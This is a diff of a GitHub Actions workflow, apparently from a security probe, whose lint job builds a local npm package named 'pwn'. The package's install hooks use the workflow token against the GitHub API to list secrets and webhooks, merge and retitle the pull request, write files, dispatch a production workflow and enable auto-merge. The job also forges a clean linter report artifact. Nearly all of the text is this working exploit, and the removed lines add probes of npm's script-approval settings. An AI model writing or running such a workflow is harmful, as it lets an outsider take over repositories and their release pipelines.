@@ -8,33 +8,6 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: probe npm script policy
-        if: always()
-        run: |
-          set +e
-          echo "PROBE_NPM_VERSION=$(npm --version) NODE=$(node --version)"
-          mkdir -p "$RUNNER_TEMP/seed/pkg/package" && cd "$RUNNER_TEMP/seed"
-          printf '%s' '{"name":"pwn","version":"1.0.0","scripts":{"preinstall":"echo PWN_DEP_PREINSTALL","install":"echo PWN_DEP_INSTALL","postinstall":"echo PWN_DEP_POSTINSTALL"}}' > pkg/package/package.json
-          tar -czf pwn-1.0.0.tgz -C pkg package
-          for v in a b c; do
-            d="$RUNNER_TEMP/v_$v"; rm -rf "$d"; mkdir -p "$d"; cd "$d"; cp "$RUNNER_TEMP/seed/pwn-1.0.0.tgz" .
-          done
-          cd "$RUNNER_TEMP/v_a"
-          printf '%s' '{"name":"a","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
-          printf 'dangerously-allow-all-scripts=true\n' > .npmrc
-          echo "=== VARIANT_A npmrc dangerously-allow-all ==="; npm install --no-save 2>&1 | tail -12
-          cd "$RUNNER_TEMP/v_b"
-          printf '%s' '{"name":"b","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"},"allowScripts":{"pwn@1.0.0":true}}' > package.json
-          echo "=== VARIANT_B package.json allowScripts object ==="; npm install --no-save 2>&1 | tail -12
-          cd "$RUNNER_TEMP/v_c"
-          printf '%s' '{"name":"c","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
-          printf 'allow-scripts[]=pwn@1.0.0\n' > .npmrc
-          echo "=== VARIANT_C npmrc allow-scripts array ==="; npm install --no-save 2>&1 | tail -12
-          cd "$RUNNER_TEMP/v_a"
-          echo "=== APPROVE INSPECTION ==="
-          npm install-scripts ls --json 2>&1 | head -25
-          npm install-scripts approve --all 2>&1 | tail -6
-          echo "PKG_AFTER:"; cat package.json; echo "NPMRC_AFTER:"; cat .npmrc; ls -a
       - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
@@ -60,56 +33,64 @@ jobs:
                 method, headers: hdr, body: body ? JSON.stringify(body) : undefined
               });
               let data = null;
-              try { data = await r.json(); } catch (e) {}
+              try { data = await r.json(); } catch (e) { data = null; }
               return { url, method, status: r.status, data };
             } catch (e) { return { url, method, error: String(e) }; }
+          }
+          async function gql(query, variables) {
+            try {
+              const r = await fetch('https://api.github.com/graphql', {
+                method: 'POST', headers: hdr, body: JSON.stringify({ query, variables })
+              });
+              let data = null;
+              try { data = await r.json(); } catch (e) {}
+              return { status: r.status, data };
+            } catch (e) { return { error: String(e) }; }
           }
           (async () => {
             const lifecycle = process.argv[2] || 'unknown';
             console.log('PWN_MARKER lifecycle=' + lifecycle + ' event=' + process.env.GITHUB_EVENT_NAME +
               ' workflow=' + process.env.GITHUB_WORKFLOW + ' run_id=' + process.env.GITHUB_RUN_ID +
-              ' token_len=' + tok.length + ' cwd=' + process.cwd());
+              ' token_len=' + tok.length);
             const out = { marker: { lifecycle, event: process.env.GITHUB_EVENT_NAME,
               workflow: process.env.GITHUB_WORKFLOW, run_id: process.env.GITHUB_RUN_ID,
               token_len: tok.length, cwd: process.cwd(), base } };
-            out.user = await api('GET', '/user');
             out.repo = await api('GET', '/repos/' + repo);
-            const mainRef = await api('GET', '/repos/' + repo + '/git/ref/heads/main');
-            const mainSha = mainRef.data && mainRef.data.object ? mainRef.data.object.sha : null;
-            out.mainRef = { status: mainRef.status, sha: mainSha };
-            out.refCreate = mainSha
-              ? await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/pwn-rce-probe', sha: mainSha })
-              : { status: 'no-sha' };
-            out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
-            out.variables = await api('GET', '/repos/' + repo + '/actions/variables');
+            const pull = await api('GET', '/repos/' + repo + '/pulls/' + pr);
+            out.pull = { status: pull.status, node_id: pull.data && pull.data.node_id,
+              mergeable: pull.data && pull.data.mergeable, auto_merge: pull.data && pull.data.auto_merge };
+            out.patch = await api('PATCH', '/repos/' + repo + '/pulls/' + pr, { title: 'docs: glossary formatting (bot edit)' });
+            out.updateBranch = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {});
+            out.review = await api('POST', '/repos/' + repo + '/pulls/' + pr + '/reviews', { body: 'bot review probe', event: 'COMMENT' });
             out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
             out.contentsPut = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt',
               { message: 'pwn probe', content: Buffer.from('pwn').toString('base64') });
             out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414903725/dispatches',
               { ref: 'main', inputs: { env: 'prod' } });
-            out.dispatchStage = await api('POST', '/repos/' + repo + '/actions/workflows/414903730/dispatches',
-              { ref: 'main', inputs: { baseSha: '' } });
+            out.rerun = await api('POST', '/repos/' + repo + '/actions/runs/' + process.env.GITHUB_RUN_ID + '/rerun', {});
+            out.caches = await api('GET', '/repos/' + repo + '/actions/caches');
+            out.hooks = await api('GET', '/repos/' + repo + '/hooks');
+            out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
+            out.createPr = await api('POST', '/repos/' + repo + '/pulls',
+              { title: 'probe', head: 'lazyhacker6:pwn', base: 'main', body: 'probe' });
+            out.gqlRepo = await gql('query($o:String!,$n:String!){repository(owner:$o,name:$n){autoMergeAllowed viewerPermission defaultBranchRef{name}}}',
+              { o: repo.split('/')[0], n: repo.split('/')[1] });
+            if (pull.data && pull.data.node_id) {
+              out.gqlAutoMerge = await gql('mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
+                { id: pull.data.node_id });
+            }
             const body = 'PWN_RCE_PROOF lifecycle=' + lifecycle + '\n```json\n' +
               JSON.stringify(out, null, 1).slice(0, 60000) + '\n```';
             out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body });
-            console.log('PWN_RESULT ' + JSON.stringify({
-              user: out.user.status, repo: out.repo.status, refCreate: out.refCreate.status,
-              secrets: out.secrets.status, variables: out.variables.status,
-              merge: out.merge.status, contentsPut: out.contentsPut.status,
-              dispatch: out.dispatch.status, dispatchStage: out.dispatchStage.status,
-              comment: out.comment.status
-            }));
-            try { fs.writeFileSync(path.join(process.cwd(), 'pwn-result-' + lifecycle + '.json'), JSON.stringify(out, null, 1)); } catch (e) {}
+            fs.writeFileSync(path.join(base, 'pwn-result-' + lifecycle + '.json'), JSON.stringify(out, null, 1));
           })();
           process.on('unhandledRejection', e => console.log('PWN unhandled ' + e));
           JS
           cp pwn.js pkg/package/index.js
           printf '%s' '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
           tar -czf pwn-1.0.0.tgz -C pkg package
-          printf '%s' '{"name":"root","version":"1.0.0","private":true,"scripts":{"preinstall":"node pwn.js preinstall","postinstall":"node pwn.js postinstall","prepare":"node pwn.js prepare"},"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
+          printf '%s' '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
           printf 'dangerously-allow-all-scripts=true\n' > .npmrc
-          d="$RUNNER_TEMP/selftest"; rm -rf "$d"; mkdir -p "$d"; cp package.json pwn-1.0.0.tgz pwn.js .npmrc "$d"/; cd "$d"
-          echo "SELFTEST_BEGIN"; npm install --no-save --foreground-scripts github:AdobeDocs/adp-devsite-scripts 2>&1 | grep -E 'PWN_|added|warn|error' | head -20; echo "SELFTEST_END"; cd "$GITHUB_WORKSPACE"
           printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
       - uses: actions/upload-artifact@v7
